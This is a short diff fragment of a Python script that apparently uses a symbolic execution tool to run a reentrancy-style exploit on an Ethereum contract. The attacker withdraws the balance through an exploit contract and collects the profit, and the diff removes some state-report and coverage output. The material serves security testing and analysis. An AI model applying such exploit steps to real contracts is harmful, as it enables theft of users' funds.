@@ -119,22 +119,11 @@ print "[+] Let attacker extract all  using exploit"
 exploit_account.proxycall(ABI.make_function_id('withdrawBalance()'))
 
 print "[+] Let attacker destroy the exploit andprofit" 
-exploit_account.get_money()
+exploit_account.get_money() 
 
 print " attacker_account %x balance: %d"% (attacker_account, seth.get_balance(attacker_account))
 print " user_account %x balance: %d"%  (user_account, seth.get_balance(user_account))
 print " contract_account %x balance: %d"%  (contract_account, seth.get_balance(contract_account))
-
-print "[+] There are %d reverted states now"% len(seth.final_state_ids)
-for state_id in seth.final_state_ids:
-    print seth.report(state_id)
-
-print "[+] There are %d alive states now"% (len(seth.running_state_ids))
-for state_id in seth.running_state_ids:
-    print seth.report(state_id)
-
-print "[+] Global coverage:"
-print seth.coverage(contract_account)
 
 
 
